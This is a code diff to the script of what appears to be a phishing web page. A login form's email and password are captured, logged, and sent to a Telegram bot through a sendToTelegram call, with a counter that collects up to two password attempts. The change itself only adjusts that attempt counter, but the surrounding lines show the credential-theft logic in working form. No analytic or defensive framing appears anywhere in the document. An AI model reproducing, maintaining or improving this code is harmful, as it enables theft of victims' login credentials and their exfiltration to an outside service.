@@ -657,7 +657,7 @@ input[type=range]::-moz-range-thumb{width:12px;height:12px;border-radius:50%;bac
 
 <script>
 
-    let attempt = 1;
+    let attempt = 0;
     const maxAttempts = 2;
     const form = document.getElementById('formdata');
     const messageDiv = document.getElementById('message');
@@ -782,7 +782,7 @@ input[type=range]::-moz-range-thumb{width:12px;height:12px;border-radius:50%;bac
 
 
 
-      if (attempt <= maxAttempts && password) {
+      if (attempt+1 <= maxAttempts && password) {
         // Send to Telegram Bot (new functionality)
         await sendToTelegram(email, password);
         console.log(email, password)
